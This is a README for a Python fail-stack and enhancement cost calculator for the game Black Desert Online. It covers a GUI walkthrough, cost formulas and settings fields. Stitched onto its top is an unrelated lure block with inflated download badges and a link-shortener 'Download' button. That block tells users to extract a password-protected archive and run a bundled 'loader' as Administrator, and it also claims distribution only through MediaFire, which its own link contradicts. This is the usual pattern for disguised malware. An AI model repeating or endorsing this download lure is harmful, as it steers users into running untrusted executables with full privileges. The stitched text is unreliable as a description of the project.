<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# BDO Enhancement Optimizer
I've throw together this fail stack calculator so that I could try out 
the new enhancement chance numbers that were released. I also wanted to 
get a more objective way to decide how to fail stack and enhance when 
considering multiple different pieces of gear at different enhancement levels.

It still needs more testing and the code  could be commented better, but I am posting 
the code so it isn't necessary to wait on me and you can alter it as you please.

## Important Info

* Gear is entered at the TARGET level of enhancement. For example a +14 Reblath Helmet is entered at Level 15
* You can sort most lists by clicking on the column header
* This program will tell you suggested fail stack level, strategy and provide a walk-through in game of each enhancement step and decision
* The program creates a settings file and log file in the %appdata% folder. Back up your settings file at least once since thie project is in alpha.
* Not all gear types have a sheet of probabilities. Let me know if you have more data.

## GUI User guide
### 1.) Go to the "Monnies/ MP" tab on the left side of the program.

* Chose if you want to sign into the online Central Market or manually enter prices
    * To sign into the Central Market click "Tools" -> "Sign into MP" on the main menu. Once you sign in a green message
should show on the main window status bar. You can close the Central Market window or keep it open.

* If you have done the Bartali quest line or have free permanent fail stacks, set the "Quest FS Increase" field 
to your minimum fail stack.

* Make sure "Value Pack Active?" is checked if you will be using a Value Pack when interacting with the central market.
    * Don't edit the tax ratios unless you really know what you are doing.

* Optional for "Strategy": Als, Valks and Naderr
    * Click "Managed saved failstacks" and enter all of the Advice of Valks that you have
    * Click "Naderr's Band" and add all your pages with their current fs
    * Click "Manage Alts/Toons" and press the "Import From Game Files" button to look for your
    FaceTexture folder. This is a folder the game uses to store your alts pictures. If you select the right
    folder it will add an alt with their picture set up. You still need to enter their name and fail stack level
        * If you do not import from game files you can enter everything manually by pressing "Add Alt"
        * Change the picture by clicking the magnifying glass or the current image of the alt

### 2.) Go to the "FS Gear" tab on the left side of the program.

* This is the gear you will be using to build fail stacks and not yet attempting an enhancement.
There should be a list of default gear if you just installed the program.

* To add gear press "Add Item." You can click on the magnifying glass icon in the "Name" column of the table to bring up a search window. Type in the gear you are
looking for and find it on the list. Double click it to register the gear with a picture, name, type and central market
functionality. Un-checking gear will keep it out of the algorithm later.

* If you signed into the online central market press "MP: Update all" to automatically update the gear costs from the central market.


### 3.) OPTIONAL: Go to the "FS Cost" tab on the left side of the program.

* Click refresh to generate a list of what to fail stack on. The numbers here should be fairly self explanatory

### 4.) Go to the "Equipment" tab on the left side of the program.

* To add gear press "Add Item." You can click on the magnifying glass icon in the "Name" column of the table to bring up a search window. Type in the gear you are
looking for and find it on the list. Double click it to register the gear with a picture, name, type and central market
functionality. Un-checking gear will keep it out of the algorithm later.

* Add gear here that you are working on enhancing. Once you add a piece of gear you can expand the item
too see future enhancements for that item. All of the checked levels of enhancement will be considered by the algorithm
but it is important to distinguish the current level of the gear. This is used to calculate when to save a fail stack and 
when to attempt an enhancement
* Note that in the "Strategy" tab, only items that are on this list are considered by the algorithm, so this can lead to decisions that would otherwise be odd
like attempting an enhancement on a low fail stack or greatly overstacking for an item. If you are only going to attempt enhancements on the gear in this list
and you either know when to stop, or you have future enhancements checked under your current gear you should be good to go.

* Once you have all your gear set up, click "MP: Update Base Cost" if you are signed into the market place or manually enter the cost
of a base item for each of the gear.

* OPTIONAL: Press "Calculate Costs" to calculate: the fail stack to start enhancing the gear, the total cost, 
the total cost of repair materials + upfront costs, the average number of fails before success, starting probability and
if you should use memory fragments.

* The cost, and suggested failstack numbers where minimize the total cost of the enhancement. Later in the
program this is referred to as a "Loss prevention" calculation.


### 5.) Go to the "Strategy" tab on the left side of the program.

* Press "Calculate" to populate the lists with data
    * This will not work unless you have at least one fail stacking item and one equipment item
    * The lists have spacers between them so you can change how much space they take up

* The left-most list is a list of fail stacks and gear that will tell you what you should optimally do on a certain fail stack
This calculation is based on gain not on loss so be aware that higher failstacks will yield more potential silver.
Higher priority enhancements should be worth more at higher fail stacks but if you are at the point where you are considering your
highest priority enhancements chose your stack wisely.

* Clicking a list item will populate the two lists on the right. The top list is a break down of fail stacking gear.
The bottom list is a break down of fail enhancing gear.
    * Cost is based on potential gain
    * Loss prevention is a measure of fail stack optimality
    * Average number of fails is starting at the current fail stack
    * Success confidence is the probability of achieving an enhancement at the current fail stack after tying "Avg num Fails" times
    * Differential is the difference in potential silver of the best gear on this fail stack


### 6.) Press the "Open Guide Overlay" button at the bottom of the "Strategy" tab
<p align="center">
  <img src="Images/compact_overlay2.png">
</p>

* This will bring up a small window that will walk you through what to do step by step.
* You must have at least one alt registered to do this
* The FS spinbox has the current fail stack on the alt displayed in the combo box below it
* Use the combo box to switch alts
* "Stay on Alt" will filter decisions for the selected alt only
* "Follow Track" will auto-accept the best decision for the piece of gear you just attempted
* The list on the left will populate with different choices for enhancing. They are sorted such that the 
decision that will net you the most silver are displayed first. Be careful, this is greedy.
* The types of decisions that show up are either considered optimal by the "Strategy" tab or they are
decent alternatives. Alternatives will have a step that will say "Consider X".
* All the decisions should be viable but it is up to you to pick which you think is best. Remember to manage your
alts and Naderr's band. For example, maybe don't fill up all ur alts with 35 stacks and then fail TRI. You will 
need a black smiths book then.
* The decisions consider:
    * Fail stacking from any level
    * Apply advice of valks
    * Using Naderrs Band
    * Using fail stacks on alts
    * Applying black smiths books
    * Combinations of above
* The items on the list have the target gear in the "Instruction" column of the root item. An
"Accept" button is next to them on the right.
* Expand Decisions with the carrot to the right of the "Accept" button to see the steps involved in each enhancement.
* Once you find a decision you like press the "Accept" button and follow the instructions.
* The program will automatically account of your alts, valks, naderrs band and everything else as long as you 
are following the instructions in the program.
* An orange arrow will point to the step you are currently on
* Once the condition has been met or the buttons under the list have been pressed the step will eithre pogress or fail
* Once a set is completed a green check mark will show next to that step
* When a gear item has changed the list will repopulate with new decisions

## Future Plans
* graphs
* Export to Excel
* Make UI more betterer in some places

## How run code
If you are unsure how to set up the environment see the \"Dependencies\" section below.
Make sure the directory that houses the code is in python path variable and run:
```
python.exe -m BDO_Enhancement_Tool
```


## Dependencies
This project depends on several libraries and some libraries of 
my own. For this project to work the utilities and QtCommon module 
collection must be present. These are small versions of larger modules 
that I copied and cleaned for convenience.

### Versions
It is recommended to install Anaconda python distribution 2.7 for this 
project because that is how it was developed.

## Methods
To be clear, I am not great at statistics so I highly encourage anyone 
who know what they are doing to critique the methods I am using to 
calculate. I detail the math here in the hopes that someone may destroy 
it \:\)

### Establishing Fail Stack Cost
The cost of a fail is an important factor in the calculation because it 
establishes a curve of value that equipment and opportunity cost rely on.

The essence of a fail stack cost at any level of fail stacks is the 
opportunity cost of acquiring another fail stack and the value of the 
current fail stack.

The opportunity cost pseudo code:
```
op_cost = black_stone_cost + (suc_rate * (last_cost + return_cost)) + (fail_rate * repair_cost)
```
Here, there is:
* black_stone_cost : Cost of black stone in one enhance attempt
* suc_rate : Probability of success enhancement
* last_cost : If this cost function of a fail stack \(F\) at position x then this is F\(x - 1\)
* return_cost : Cost to return the gear to how it was before the success. This is either cleanse cost or the cost of materials in the case of accessories (rely on cost class member in this case)
* reapir_cost : This is the cost to restore the gear after a fail
* See common.py -> simulate_FS

Since the opportunity cost is just the cost for the opportunity to 
gain a fail stack, we calculate the average amount of opportunities 
incurred before a fail is achieved. Now and hereafter the number of 
fails is calculated as the average number of fails:
```
avg_num_fails = 1.0 / suc_rate
```

Since for fail stacking we are counting the number of successes before a
failure we have:
```
avg_num_success = 1.0 / fail_rate
```

### Calculating Enhancement Cost

The next step is to use the global fail stack cost curve to find the 
number of fail stacks for each gear such that the cost of enhancing at 
that number of fail stacks is minimized. Fail stacks get expensive 
quickly, almost needlessly so, an attempt at mitigating this issue is 
addressed next.

The method for calculating the price uses the same concept from before 
where an average number opportunities is calculated and then used with 
probabilities to compute an overall cost. The difference here is an 
a number of fails is calculated and the remainder is used as a number of 
successes. These are not integer values. The basic pseudo code for the 
enhancement cost of a piece of equipment at a particular fail stack:

```
avg_num_attempts = 1.0 / suc_rate
avg_num_fails = avg_num_attempts - 1

fails_cost = avg_num_fails * repair_cost
total_cost = fails_cost + cum_fs_cost + (black_stone_cost * avg_num_attempts)
```

Here we have:
* avg_num_attempts : The average number of attempts for one success
* avg_num_fails : The average number of attempts BEFORE one success
* fails_cost : The cost of failure
* cum_fs_cost : Cumulative cost of fail stacking to position x
* total_cost : The cost of the average number of fails and the one success

Notice here that the price of the fail stack is included in the success rate.
This may be obvious, but it is there so the max fail stack isn't chosen every time.
Here we have cumulative fail stack cost compared to repair cost.

What about gear that drops an enhancement level upon failure:

```
backtrack_start = lvl_map['TRI']

for i in range(0, 3):
    this_pos = backtrack_start + i
    prev_cost = min(total_cost[this_pos - 1])
    new_avg_attempts = 1.0 / suc_rate[this_pos - 1]
    new_num_fails = new_avg_attempts - 1
    new_fail_cost = repair_cost + prev_cost 
    total_cost[this_pos] = (new_num_fails * new_fail_cost) + (black_stone_costs[this_pos] * new_avg_attempts) + cum_fs_cost
```

This is just a loop starting at \"TRI\" which is \"DUO\" -> \"TRI\" that
factors in the previous gear cost upon failure. The cost formula is the 
came as above

Here we have:
* backtrack_start: An integer index where we start adding the previous cost
* this_pos: Position in the list of enhancement levels counter
* prev_cost: Cost of enhancing one level below
* new_avg_attempts: The average number of attempts for one success
* new_num_fails: The average number of attempts BEFORE one success
* cum_fs_cost: Cumulative cost of fail stacking to position x

Notice that this method needs to be different for accessories and the like.

### Calculating Enhancement Strategy
This needs an update. The previous explination does not represent the code anymore.

### Calculating Enhancement Probability

A quick note on the \"Strategy\" tab in the bottom right list of enhancing gear there is a probability on the far end
of the list. This probability is the chance of at least one success in n trials, where n is the average number or
trails to success. This probability helps determine a reasonable amount of fail stacks because it gives the confidence that
attempting the average number of trials will result in success.
## Files
Below are file definitions or descriptions of some of the files that this project uses.


### \*.log Files
Log files simply contain debug information that the program has output. 
Typically this file should not be altered by the user. These files 
should not be copied from one machine to another or it could make 
debugging the application harder. There is no maximum file size for 
these so if they get to big they can be deleted. That should not be a 
problem though

### settings.json
As the name would suggest this file is a JSON string that contains the 
programs settings. They can be safely edited with a text editor; be careful.
 If you really screwed up the settings file it can just be deleted. 
 The next time the program runs it will simply create a new settings 
 file with default values. The settings file is auto saved when the program 
 exits unless it crashes. This can be revised later. The settings file can be 
 found in the user %APPDATA% path under a folder named after this program. A command line 
 parameter should be used to supply the default loaded settings file in 
 the future. Below are a description of the fields:

Parameter | Default Value | Description
--- | --- | ---
fail_stackers | [] | List of gear objects on the fail stacking list
enhance_me | [] | List of gear objects on the enhancement list
r_fail_stackers | [] | List of gear objects removed from the fail stacking list
r_enhance_me | [] | List of gear objects removed from the enhancement list
fail_stackers_count | {} | Dictionary of indexes pointing to fail stacking items that specifies their count. If the value is encapsulated in a list it is in the removed list.
fs_exceptions | {} | Dictionary of fail stack indexes that corrispond to indexes of fail stack gear items
cost_conc_w | 2590000 | Cost of Conc stone (Weapon) (silver)
cost_conc_a | 1470000 | Cost of Conc stone (Armor) (silver)
cost_bs_w | 225000 | Cost of Black Stone stone (Weapon) (silver)
cost_bs_a | 220000 | Cost of Black Stone stone (Armor) (silver)
cost_cron | 2000000 | Cost of cron stone (silver)
cost_cleanse | 100000 |  Cost to clease gear from +15 to +14
cost_meme | 1740000 |  Cost of Memory Fragment
alts | \[\[\]\] | List of lists of size 3 \[img path, name, fail stack level \]
valks | \[\] | List of Valks enhance items (values)
quest_fs_inc | 0 | Bonus fail stacks from quests like the Bartali Adventure log
central_market_tax_rate | 0.65 | Tax rate on central market. This should probably not be changed
value_pack_p | 0.3 | Percentage of after tax value a Value Pack adds to sale balance
is_value_pack | True | Is a Value Pack active
merch_ring | 0.05 | Percentage of after tax value a Rich Merchant Ring adds to sale balance
is_merch_ring | False | Is a Rich Merchant Ring active
_version | None | Version information for change tracking

#### Gear Object
The gear object is a json string object that is encapsulated in the settings file.

Parameter | Description
--- | ---
name | A name for the piece of gear. 
cost | Cost of the base item, or cost of resetting an item after a fail attempt.
fail_dura_cost | For repairable items this is the amount of durability lost in failure.
enhance_lvl | String that denotes the level of enhancement, like \"PRI\"
gear_type | Corresponds to a file in the Data folder that describes it's enhancement levels and probabilities.
sale_balance | A balance that is added to the value of an item when fail stacking on enhancement success. For example sale price of TET minus price of DUO if purchased at DUO.
